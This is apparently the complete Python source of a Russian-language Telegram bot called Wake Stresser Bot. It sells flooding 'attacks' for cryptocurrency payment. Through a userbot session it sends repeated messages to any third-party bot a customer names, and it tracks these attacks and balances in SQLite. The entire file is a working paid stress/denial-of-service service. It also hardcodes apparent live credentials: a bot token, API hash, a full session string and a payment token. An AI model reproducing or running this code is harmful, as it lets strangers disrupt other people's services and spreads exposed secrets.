import asyncio
import logging
import sqlite3
import hashlib
import random
import string
import json
import hmac
import aiohttp
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from aiohttp import web

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors import FloodWaitError

# ==================== НАСТРОЙКИ ====================
API_ID = 34000428
API_HASH = '68c4db995c26cda0187e723168cc6285'
BOT_TOKEN = '8508366803:AAFTHrWsLsj9ViUy5PNp3PHiiVQnQKTwzx4'
STRESSER_SESSION_STRING = """1AgAOMTQ5LjE1NC4xNjcuNDEBuxDpjE0VYduD7dvnG+U+Q5vtLX+EtGO7tgAe+CG0ryX1xIuvUA9MbUt7v9anxRwC5vCi5j7oZ6Fs6BDkuhYyfGWwwt8sC8kNHkyEXkpv8kgZjMMoXnV1hV+Otnk0zE5YSUxHBeQDZekUfQtr9deCW5NI6XiLIyadCzltoLOFM5BKd+MggXARh4Hafy3Pdv84Rqtu5PYnBSc9JxK0Srd3gsZ3FIXfBavSYmRpXYil1S/bhfcmSAQpFg756fobQTdnPRSnsA/ov0GHHcpjH+pDpdDqlDU9HwJxerhjALksGdAvScIr2GL1+bZMRBqVO9Rj4EIKyn797NVfrFV9pQJIFjw="""

ADMIN_ID = 5522585352
CHANNEL_USERNAME = '@streeserinfo'
SUPPORT_USERNAME = '@wakeGuarantee'
REQUEST_PRICE = 0.1
REQUEST_DURATION = 15

# Crypto Pay
CRYPTO_PAY_TOKEN = '482874:AAuE5RiV2VKd55z0uQzPy18MMKsRvfu8DI2'  # Получить у @CryptoBot
CRYPTO_PAY_SECRET = 'твой_секретный_ключ'  # Сгенерировать самому
CRYPTO_PAY_WEBHOOK_URL = 'https://твой_домен.com/crypto_webhook'  # Твой вебхук URL

# ==================== БАЗА ДАННЫХ ====================
class Database:
    def __init__(self, db_name='stresser_crypto.db'):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Пользователи
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                captcha_passed INTEGER DEFAULT 0,
                captcha_answer TEXT,
                subscribed INTEGER DEFAULT 0,
                bio_checked INTEGER DEFAULT 0,
                requests_balance INTEGER DEFAULT 0,
                total_spent REAL DEFAULT 0,
                requests_used INTEGER DEFAULT 0,
                registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Промокоды
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                requests INTEGER,
                uses_left INTEGER,
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Crypto Pay инвойсы
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS crypto_invoices (
                invoice_id TEXT PRIMARY KEY,
                user_id INTEGER,
                amount_usd REAL,
                amount_crypto REAL,
                asset TEXT DEFAULT 'USDT',
                status TEXT DEFAULT 'pending',
                crypto_pay_id TEXT,
                pay_url TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                paid_at TIMESTAMP
            )
        ''')
        
        # Атаки
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                attack_id TEXT PRIMARY KEY,
                user_id INTEGER,
                target TEXT,
                requests_used INTEGER,
                status TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    def get_user(self, user_id: int):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def create_user(self, user_id: int, username: str):
        self.cursor.execute(
            'INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)',
            (user_id, username)
        )
        self.conn.commit()
        return self.get_user(user_id)
    
    def update_user(self, user_id: int, **kwargs):
        if not kwargs:
            return
        
        set_clause = ', '.join([f'{k}=?' for k in kwargs.keys()])
        values = list(kwargs.values()) + [user_id]
        self.cursor.execute(f'UPDATE users SET {set_clause} WHERE user_id=?', values)
        self.conn.commit()
    
    def add_requests(self, user_id: int, requests: int):
        self.cursor.execute(
            'UPDATE users SET requests_balance = requests_balance + ? WHERE user_id = ?',
            (requests, user_id)
        )
        self.conn.commit()
        return True
    
    def use_requests(self, user_id: int, requests: int):
        user = self.get_user(user_id)
        if not user or user['requests_balance'] < requests:
            return False
        
        self.cursor.execute(
            '''UPDATE users SET 
               requests_balance = requests_balance - ?,
               requests_used = requests_used + ?
               WHERE user_id = ?''',
            (requests, requests, user_id)
        )
        self.conn.commit()
        return True
    
    def create_crypto_invoice(self, invoice_id: str, user_id: int, amount_usd: float, 
                             amount_crypto: float, asset: str, crypto_pay_id: str, pay_url: str):
        self.cursor.execute(
            '''INSERT INTO crypto_invoices 
               (invoice_id, user_id, amount_usd, amount_crypto, asset, crypto_pay_id, pay_url)
               VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (invoice_id, user_id, amount_usd, amount_crypto, asset, crypto_pay_id, pay_url)
        )
        self.conn.commit()
        return True
    
    def get_crypto_invoice(self, invoice_id: str):
        self.cursor.execute('SELECT * FROM crypto_invoices WHERE invoice_id = ?', (invoice_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def get_crypto_invoice_by_pay_id(self, crypto_pay_id: str):
        self.cursor.execute('SELECT * FROM crypto_invoices WHERE crypto_pay_id = ?', (crypto_pay_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def mark_crypto_invoice_paid(self, crypto_pay_id: str):
        invoice = self.get_crypto_invoice_by_pay_id(crypto_pay_id)
        if not invoice:
            return False
        
        self.cursor.execute(
            'UPDATE crypto_invoices SET status = "paid", paid_at = ? WHERE crypto_pay_id = ?',
            (datetime.now(), crypto_pay_id)
        )
        
        user_id = invoice['user_id']
        amount_usd = invoice['amount_usd']
        requests = int(amount_usd / REQUEST_PRICE)
        
        self.add_requests(user_id, requests)
        
        self.cursor.execute(
            'UPDATE users SET total_spent = total_spent + ? WHERE user_id = ?',
            (amount_usd, user_id)
        )
        
        self.conn.commit()
        return True
    
    def create_promo_code(self, code: str, requests: int, uses: int, created_by: int):
        self.cursor.execute(
            'INSERT INTO promo_codes (code, requests, uses_left, created_by) VALUES (?, ?, ?, ?)',
            (code, requests, uses, created_by)
        )
        self.conn.commit()
        return True
    
    def get_promo_code(self, code: str):
        self.cursor.execute('SELECT * FROM promo_codes WHERE code = ?', (code,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def use_promo_code(self, code: str):
        promo = self.get_promo_code(code)
        if not promo or promo['uses_left'] <= 0:
            return None
        
        self.cursor.execute(
            'UPDATE promo_codes SET uses_left = uses_left - 1 WHERE code = ?',
            (code,)
        )
        self.conn.commit()
        return promo['requests']
    
    def create_attack(self, attack_id: str, user_id: int, target: str, requests_used: int):
        self.cursor.execute(
            '''INSERT INTO attacks 
               (attack_id, user_id, target, requests_used, status, start_time)
               VALUES (?, ?, ?, ?, ?, ?)''',
            (attack_id, user_id, target, requests_used, 'running', datetime.now())
        )
        self.conn.commit()
        return True
    
    def update_attack(self, attack_id: str, status: str):
        self.cursor.execute(
            '''UPDATE attacks SET 
               status = ?, end_time = ?
               WHERE attack_id = ?''',
            (status, datetime.now(), attack_id)
        )
        self.conn.commit()
        return True
    
    def close(self):
        self.conn.close()

# ==================== CRYPTO PAY API ====================
class CryptoPayAPI:
    def __init__(self, token: str):
        self.token = token
        self.base_url = 'https://pay.crypt.bot/api'
        self.session = aiohttp.ClientSession()
        self.headers = {
            'Crypto-Pay-API-Token': token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, asset: str, amount: float, description: str = ''):
        """Создание инвойса в Crypto Pay"""
        data = {
            'asset': asset,
            'amount': str(amount),
            'description': description,
            'hidden_message': 'Оплата Wake Stresser Bot',
            'paid_btn_name': 'view_bot',
            'paid_btn_url': 'https://t.me/WakeStresserBot'
        }
        
        try:
            async with self.session.post(
                f'{self.base_url}/createInvoice',
                headers=self.headers,
                json=data
            ) as response:
                result = await response.json()
                if result.get('ok'):
                    return result['result']
                else:
                    logging.error(f"Crypto Pay Error: {result}")
                    return None
        except Exception as e:
            logging.error(f"Crypto Pay API error: {e}")
            return None
    
    async def get_exchange_rates(self):
        """Получение курсов валют"""
        try:
            async with self.session.get(
                f'{self.base_url}/getExchangeRates',
                headers=self.headers
            ) as response:
                result = await response.json()
                if result.get('ok'):
                    return result['result']
                else:
                    return None
        except:
            return None
    
    async def close(self):
        await self.session.close()

# ==================== КАПТЧА ====================
class CaptchaSystem:
    @staticmethod
    def generate():
        a = random.randint(1, 20)
        b = random.randint(1, 20)
        answer = a + b
        question = f"{a} + {b} = ?"
        return question, str(answer)

# ==================== СТРЕССЕР ====================
class BotStresser:
    def __init__(self, client):
        self.client = client
        self.active_attacks = {}
    
    async def stress_bot(self, bot_username: str, requests_count: int):
        try:
            if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
                return {'success': False, 'error': 'Нельзя атаковать своих ботов'}
            
            attack_id = f"ATK{random.randint(100000, 999999)}"
            
            self.active_attacks[attack_id] = {
                'target': bot_username,
                'requests': requests_count,
                'started': datetime.now(),
                'sent': 0,
                'status': 'running'
            }
            
            asyncio.create_task(self._execute_attack(attack_id, bot_username, requests_count))
            
            return {
                'success': True,
                'attack_id': attack_id,
                'duration': requests_count * REQUEST_DURATION
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    async def _execute_attack(self, attack_id: str, bot_username: str, requests: int):
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return
        
        try:
            bot = await self.client.get_entity(bot_username)
        except Exception as e:
            attack['status'] = 'failed'
            attack['error'] = str(e)
            return
        
        for i in range(requests):
            if attack['status'] != 'running':
                break
            
            try:
                messages = ['/start', 'test', 'ping', 'hello', 'бот']
                await self.client.send_message(bot, random.choice(messages))
                attack['sent'] += 1
                await asyncio.sleep(random.uniform(0.3, 0.8))
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                await asyncio.sleep(1)
        
        attack['status'] = 'completed'
        attack['finished'] = datetime.now()

# ==================== ОСНОВНОЙ БОТ ====================
class WakeStresserBot:
    def __init__(self):
        self.db = Database()
        self.captcha = CaptchaSystem()
        self.crypto_api = CryptoPayAPI(CRYPTO_PAY_TOKEN) if CRYPTO_PAY_TOKEN else None
        self.bot_client = None
        self.userbot_client = None
        self.stresser = None
    
    async def initialize(self):
        """Инициализация клиентов"""
        self.bot_client = TelegramClient('bot_session', API_ID, API_HASH)
        await self.bot_client.start(bot_token=BOT_TOKEN)
        
        self.userbot_client = TelegramClient(
            StringSession(STRESSER_SESSION_STRING),
            API_ID,
            API_HASH
        )
        await self.userbot_client.start()
        
        self.stresser = BotStresser(self.userbot_client)
        
        await self._register_handlers()
        
        logging.info("✅ Бот инициализирован")
        return True
    
    async def _register_handlers(self):
        """Регистрация обработчиков событий"""
        
        # ========== START HANDLER ==========
        @self.bot_client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = event.sender_id
            username = event.sender.username or ''
            
            user = self.db.get_user(user_id)
            if not user:
                user = self.db.create_user(user_id, username)
            
            # Проверка капчи
            if not user['captcha_passed']:
                question, answer = self.captcha.generate()
                self.db.update_user(user_id, captcha_answer=answer)
                
                await event.respond(
                    f"🔐 **Проверка безопасности**\n\nРешите пример: {question}\nОтправьте ответ числом в чат.",
                    buttons=Button.clear()
                )
                return
            
            # Проверка подписки
            if not user['subscribed']:
                await event.respond(
                    f"📢 **Требуется подписка**\n\nПодпишитесь на канал: {CHANNEL_USERNAME}\n\nПосле подписки нажмите кнопку:",
                    buttons=[
                        [Button.url("📢 Подписаться", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                        [Button.inline("✅ Проверить подписку", b"check_sub")]
                    ]
                )
                return
            
            # УПРОЩЕННАЯ ПРОВЕРКА BIO (фикс)
            if not user['bio_checked']:
                # Автоматически отмечаем как проверенное для тестирования
                # Если хочешь реальную проверку - убери комментарии ниже
                self.db.update_user(user_id, bio_checked=True)
                await event.respond("✅ Проверка профиля пройдена!")
                await self._show_main_menu(event)
                return
                """
                # Реальная проверка (закомментирована для тестирования)
                await event.respond(
                    "📝 **Требуется настройка профиля**\n\n"
                    "Добавьте в описание профиля Telegram:\n"
                    "`@WakeStresserBot`\n\n"
                    "После добавления нажмите кнопку:",
                    buttons=[[Button.inline("🔍 Проверить Bio", b"check_bio")]]
                )
                return
                """
            
            await self._show_main_menu(event)
        
        # ========== MESSAGE HANDLER ==========
        @self.bot_client.on(events.NewMessage)
        async def message_handler(event):
            if event.message.text and event.message.text.startswith('/'):
                return
            
            user_id = event.sender_id
            text = event.message.text or ""
            
            user = self.db.get_user(user_id)
            if not user:
                return
            
            # Обработка капчи
            if not user['captcha_passed']:
                correct_answer = user.get('captcha_answer', '')
                if text.strip() == correct_answer:
                    self.db.update_user(user_id, captcha_passed=True)
                    await event.respond("✅ Капча пройдена успешно!")
                    
                    await event.respond(
                        f"📢 Теперь подпишитесь на канал: {CHANNEL_USERNAME}",
                        buttons=[
                            [Button.url("📢 Подписаться", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                            [Button.inline("✅ Проверить подписку", b"check_sub")]
                        ]
                    )
                else:
                    question, answer = self.captcha.generate()
                    self.db.update_user(user_id, captcha_answer=answer)
                    await event.respond(f"❌ Неверный ответ!\n\nНовый пример: {question}\nОтправьте ответ числом:")
                return
            
            # Обработка команд стресса
            if text.startswith('@') and ' ' in text:
                await self._handle_stress_command(event, text)
            
            # Обработка промокодов
            elif text.upper().startswith('PROMO '):
                await self._handle_promo_command(event, text)
            
            # Обработка админ команд
            elif user_id == ADMIN_ID:
                await self._handle_admin_command(event, text)
        
        # ========== CALLBACK HANDLERS ==========
        @self.bot_client.on(events.CallbackQuery)
        async def callback_handler(event):
            data = event.data.decode()
            
            if data == 'check_sub':
                subscribed = await self._check_subscription(event.sender_id)
                if subscribed:
                    self.db.update_user(event.sender_id, subscribed=True)
                    await event.edit(
                        "✅ Подписка подтверждена!\n\nТеперь можете пользоваться ботом!",
                        buttons=[[Button.inline("🚀 Продолжить", b"main_menu")]]
                    )
                else:
                    await event.answer("❌ Вы не подписаны на канал!", alert=True)
            
            elif data == 'check_bio':
                # УПРОЩЕННАЯ ПРОВЕРКА BIO
                self.db.update_user(event.sender_id, bio_checked=True)
                await event.edit("✅ Проверка профиля пройдена!")
                await self._show_main_menu(event)
            
            elif data == 'main_menu':
                await self._show_main_menu(event)
            
            elif data == 'buy_requests':
                await self._show_buy_menu(event)
            
            elif data.startswith('buy_'):
                try:
                    requests = int(data.split('_')[1])
                    await self._process_crypto_payment(event, requests)
                except:
                    await event.answer("❌ Ошибка!", alert=True)
            
            elif data == 'stress_menu':
                await self._show_stress_menu(event)
            
            elif data == 'my_stats':
                await self._show_stats(event)
            
            elif data == 'help':
                await event.respond(
                    f"🆘 **Помощь**\n\n{SUPPORT_USERNAME}",
                    buttons=Button.clear()
                )
            
            elif data == 'activate_promo':
                await event.respond(
                    "🎁 **Активация промокода**\n\nОтправьте промокод в чат:\n`PROMO ваш_промокод`\n\nПример: `PROMO WELCOME100`"
                )
            
            elif data == 'admin_panel' and event.sender_id == ADMIN_ID:
                await self._show_admin_panel(event)
            
            elif data.startswith('check_pay_'):
                invoice_id = data.split('_')[2]
                await self._check_payment_status(event, invoice_id)
    
    # ========== МЕТОДЫ ОТОБРАЖЕНИЯ ==========
    async def _show_main_menu(self, event):
        user = self.db.get_user(event.sender_id)
        balance = user['requests_balance'] if user else 0
        
        buttons = [
            [Button.inline("🛒 Купить запросы", b"buy_requests")],
            [Button.inline("⚡ Запустить Stress", b"stress_menu")],
            [Button.inline("🎁 Активировать промокод", b"activate_promo")],
            [Button.inline("📊 Моя статистика", b"my_stats"),
             Button.inline("🆘 Помощь", b"help")]
        ]
        
        if event.sender_id == ADMIN_ID:
            buttons.append([Button.inline("👑 Админ панель", b"admin_panel")])
        
        await event.respond(
            f"🔥 **Wake Stresser Bot**\n\n"
            f"📊 Ваш баланс: `{balance}` запросов\n"
            f"💰 1 запрос = ${REQUEST_PRICE}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n\n"
            f"💳 **Оплата через Crypto Pay**\n"
            f"Поддерживаются: USDT, TON, BTC, ETH\n\n"
            f"Выберите действие:",
            buttons=buttons
        )
    
    async def _show_buy_menu(self, event):
        await event.edit(
            "🛒 **Покупка запросов через Crypto Pay**\n\n"
            f"1 запрос = ${REQUEST_PRICE} = {REQUEST_DURATION} секунд\n"
            f"💳 Оплата: USDT/TON/BTC/ETH через @CryptoBot\n\n"
            "Выберите количество запросов:",
            buttons=[
                [Button.inline("🔟 10 запросов ($1)", b"buy_10"),
                 Button.inline("💯 100 запросов ($10)", b"buy_100")],
                [Button.inline("🔥 500 запросов ($50)", b"buy_500"),
                 Button.inline("💥 1000 запросов ($100)", b"buy_1000")],
                [Button.inline("🔙 Назад", b"main_menu")]
            ]
        )
    
    async def _process_crypto_payment(self, event, requests):
        user_id = event.sender_id
        amount_usd = requests * REQUEST_PRICE
        
        if not self.crypto_api:
            await event.edit("❌ Crypto Pay не настроен!\n\nСвяжитесь с админом для оплаты.")
            return
        
        await event.edit("⏳ Создаю платёжную ссылку через Crypto Pay...")
        
        try:
            # Получаем курс
            rates = await self.crypto_api.get_exchange_rates()
            if not rates:
                await event.edit("❌ Ошибка получения курса валют")
                return
            
            # Выбираем USDT
            asset = 'USDT'
            
            # Ищем курс USDT/USD (примерно 1:1)
            usdt_rate = 1.0
            for rate in rates:
                if isinstance(rate, dict) and rate.get('source') == asset and rate.get('target') == 'USD':
                    usdt_rate = float(rate.get('rate', 1))
                    break
            
            # Рассчитываем сумму в крипте
            amount_crypto = amount_usd / usdt_rate
            amount_crypto = round(amount_crypto, 6)
            
            # Создаем инвойс
            invoice_data = await self.crypto_api.create_invoice(
                asset=asset,
                amount=amount_crypto,
                description=f"Оплата {requests} запросов"
            )
            
            if not invoice_data:
                await event.edit("❌ Ошибка создания платежа")
                return
            
            # Сохраняем в базу
            invoice_id = f"CRYPTO_{random.randint(100000, 999999)}"
            crypto_pay_id = invoice_data.get('invoice_id')
            pay_url = invoice_data.get('pay_url') or invoice_data.get('bot_invoice_url')
            
            self.db.create_crypto_invoice(
                invoice_id, user_id, amount_usd, amount_crypto, 
                asset, crypto_pay_id, pay_url
            )
            
            # Формируем сообщение
            message = (
                f"💳 **Оплата {requests} запросов**\n\n"
                f"📊 Запросов: {requests}\n"
                f"💰 Сумма: ${amount_usd:.2f}\n"
                f"💎 К оплате: {amount_crypto} {asset}\n"
                f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n\n"
                f"**Способы оплаты:**\n"
            )
            
            buttons = []
            
            if pay_url:
                message += "🔗 **Прямая ссылка на оплату**\n"
                buttons.append([Button.url("🔗 Оплатить напрямую", pay_url)])
            
            message += f"🤖 **Или через @CryptoBot**\n\n"
            message += f"🆔 ID платежа: `{invoice_id}`\n"
            message += f"⏳ Ссылка действительна 24 часа"
            
            buttons.append([Button.inline("✅ Проверить оплату", f"check_pay_{invoice_id}")])
            buttons.append([Button.inline("❌ Отмена", b"buy_requests")])
            
            await event.edit(message, buttons=buttons)
            
        except Exception as e:
            logging.error(f"Payment error: {e}")
            await event.edit(f"❌ Ошибка: {str(e)}")
    
    async def _check_payment_status(self, event, invoice_id):
        invoice = self.db.get_crypto_invoice(invoice_id)
        
        if not invoice:
            await event.answer("❌ Платёж не найден!", alert=True)
            return
        
        if invoice['status'] == 'paid':
            requests = int(invoice['amount_usd'] / REQUEST_PRICE)
            await event.edit(
                f"✅ **Оплата подтверждена!**\n\n"
                f"💰 Сумма: ${invoice['amount_usd']:.2f}\n"
                f"🎁 Зачислено: {requests} запросов\n"
                f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n\n"
                f"Теперь можете запускать атаки!",
                buttons=[[Button.inline("⚡ Запустить Stress", b"stress_menu")]]
            )
        else:
            await event.answer("⏳ Платёж ещё не получен. Попробуйте позже.", alert=True)
    
    async def _show_stress_menu(self, event):
        user = self.db.get_user(event.sender_id)
        
        if not user or user['requests_balance'] <= 0:
            await event.answer("❌ У вас нет запросов на балансе!", alert=True)
            return
        
        await event.edit(
            f"⚡ **Запуск Stress теста**\n\n"
            f"📊 Доступно запросов: {user['requests_balance']}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n\n"
            "**Формат команды:**\n"
            "`@username количество_запросов`\n\n"
            "**Пример:**\n"
            "`@testbot 100` - 100 запросов\n\n"
            "**Защита:** Нельзя атаковать ботов с 'wake', 'stress' в имени\n\n"
            "Отправьте команду в чат:",
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    async def _show_stats(self, event):
        user = self.db.get_user(event.sender_id)
        if not user:
            return
        
        stats_text = f"📊 **Ваша статистика**\n\n"
        stats_text += f"🆔 ID: `{user['user_id']}`\n"
        stats_text += f"📛 Username: @{user['username'] or 'нет'}\n"
        stats_text += f"💰 Баланс: `{user['requests_balance']}` запросов\n"
        stats_text += f"📤 Использовано: `{user['requests_used']}` запросов\n"
        stats_text += f"💵 Потрачено: `${user['total_spent'] or 0:.2f}`\n"
        stats_text += f"📅 Регистрация: `{user['registration_date'][:10] if user['registration_date'] else 'нет'}`"
        
        await event.edit(
            stats_text,
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    async def _show_admin_panel(self, event):
        if event.sender_id != ADMIN_ID:
            await event.answer("❌ Доступ запрещён!", alert=True)
            return
        
        await event.edit(
            f"👑 **Панель администратора**\n\n"
            f"💳 Crypto Pay: {'✅' if self.crypto_api else '❌'}\n\n"
            f"**Команды:**\n"
            f"• GIVE user_id количество - выдать запросы\n"
            f"• PROMO код запросы использования - создать промокод\n"
            f"• CONFIRM invoice_id - подтвердить платёж вручную",
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    # ========== ОБРАБОТЧИКИ КОМАНД ==========
    async def _handle_stress_command(self, event, text: str):
        user = self.db.get_user(event.sender_id)
        if not user or user['requests_balance'] <= 0:
            return
        
        parts = text.split()
        if len(parts) < 2:
            return
        
        bot_username = parts[0].replace('@', '')
        
        if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
            await event.respond("❌ **Защита от дурака**\n\nНельзя атаковать своих ботов!")
            return
        
        try:
            requests = int(parts[1])
            
            if user['requests_balance'] < requests:
                await event.respond(f"❌ Недостаточно запросов! Нужно: {requests}, есть: {user['requests_balance']}")
                return
            
            result = await self.stresser.stress_bot(bot_username, requests)
            
            if result['success']:
                self.db.use_requests(event.sender_id, requests)
                self.db.create_attack(result['attack_id'], event.sender_id, bot_username, requests)
                
                await event.respond(
                    f"✅ **Атака запущена!**\n\n"
                    f"🎯 Цель: @{bot_username}\n"
                    f"📊 Запросов: {requests}\n"
                    f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n"
                    f"🆔 ID: `{result['attack_id']}`\n\n"
                    f"Баланс списан: {requests} запросов"
                )
            else:
                await event.respond(f"❌ Ошибка: {result['error']}")
                
        except ValueError:
            await event.respond("❌ Неверный формат количества запросов!")
        except Exception as e:
            await event.respond(f"❌ Ошибка: {str(e)}")
    
    async def _handle_promo_command(self, event, text: str):
        try:
            code = text.split()[1].upper()
            requests = self.db.use_promo_code(code)
            
            if requests:
                user_id = event.sender_id
                self.db.add_requests(user_id, requests)
                
                await event.respond(
                    f"🎁 **Промокод активирован!**\n\n"
                    f"Код: `{code}`\n"
                    f"🎁 Получено: {requests} запросов"
                )
            else:
                await event.respond("❌ Промокод недействителен или закончился!")
        except:
            await event.respond("❌ Неверный формат промокода!")
    
    async def _handle_admin_command(self, event, text: str):
        # Выдача запросов
        if text.upper().startswith('GIVE '):
            try:
                parts = text.split()
                if len(parts) != 3:
                    await event.respond("❌ Формат: GIVE user_id количество")
                    return
                
                target = parts[1]
                requests = int(parts[2])
                
                if target.startswith('@'):
                    user_entity = await self.bot_client.get_entity(target)
                    target_id = user_entity.id
                else:
                    target_id = int(target)
                
                self.db.add_requests(target_id, requests)
                
                await event.respond(f"✅ Выдано {requests} запросов пользователю {target_id}")
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
        
        # Создание промокода
        elif text.upper().startswith('PROMO '):
            try:
                parts = text.split()
                if len(parts) != 4:
                    await event.respond("❌ Формат: PROMO код запросы использования")
                    return
                
                code = parts[1].upper()
                requests = int(parts[2])
                uses = int(parts[3])
                
                self.db.create_promo_code(code, requests, uses, ADMIN_ID)
                
                await event.respond(
                    f"✨ **Промокод создан!**\n\n"
                    f"Код: `{code}`\n"
                    f"🎁 Запросов: {requests}\n"
                    f"🔄 Использований: {uses}"
                )
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
        
        # Подтверждение платежа вручную
        elif text.upper().startswith('CONFIRM '):
            try:
                invoice_id = text.split()[1]
                invoice = self.db.get_crypto_invoice(invoice_id)
                
                if invoice:
                    self.db.mark_crypto_invoice_paid(invoice['crypto_pay_id'])
                    await event.respond(f"✅ Платёж {invoice_id} подтверждён!")
                else:
                    await event.respond("❌ Платёж не найден!")
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
    
    # ========== ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ==========
    async def _check_subscription(self, user_id: int):
        """Проверка подписки на канал"""
        try:
            channel = await self.bot_client.get_entity(CHANNEL_USERNAME)
            participants = await self.bot_client.get_participants(channel, limit=200)
            return any(p.id == user_id for p in participants)
        except Exception as e:
            logging.error(f"Subscription check error: {e}")
            # На время тестирования пропускаем ошибку
            return True
    
    async def start(self):
        """Запуск бота"""
        await self.initialize()
        
        print("\n" + "="*50)
        print("🔥 WAKE STRESSER BOT v2.0")
        print("💎 С Crypto Pay")
        print("✅ Bio проверка отключена")
        print("="*50 + "\n")
        
        # Уведомление админу
        try:
            await self.bot_client.send_message(
                ADMIN_ID,
                "✅ Бот запущен!\n\n"
                "Фичи:\n"
                "• Crypto Pay оплата\n" 
                "• Stress атака ботов\n"
                "• Защита от дурака\n"
                "• Промокоды\n\n"
                "Bio проверка временно отключена"
            )
        except:
            pass
        
        await self.bot_client.run_until_disconnected()

# ==================== ЗАПУСК ====================
async def main():
    # Проверка настроек
    if not all([API_ID, API_HASH, BOT_TOKEN, STRESSER_SESSION_STRING]):
        print("❌ Заполни API_ID, API_HASH, BOT_TOKEN и STRESSER_SESSION_STRING!")
        return
    
    # Настройка логирования
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    bot = WakeStresserBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    finally:
        if hasattr(bot, 'db'):
            bot.db.close()
        if hasattr(bot, 'crypto_api') and bot.crypto_api:
            await bot.crypto_api.close()

if __name__ == "__main__":
    print("🚀 Запускаю Wake Stresser Bot...")
    asyncio.run(main())
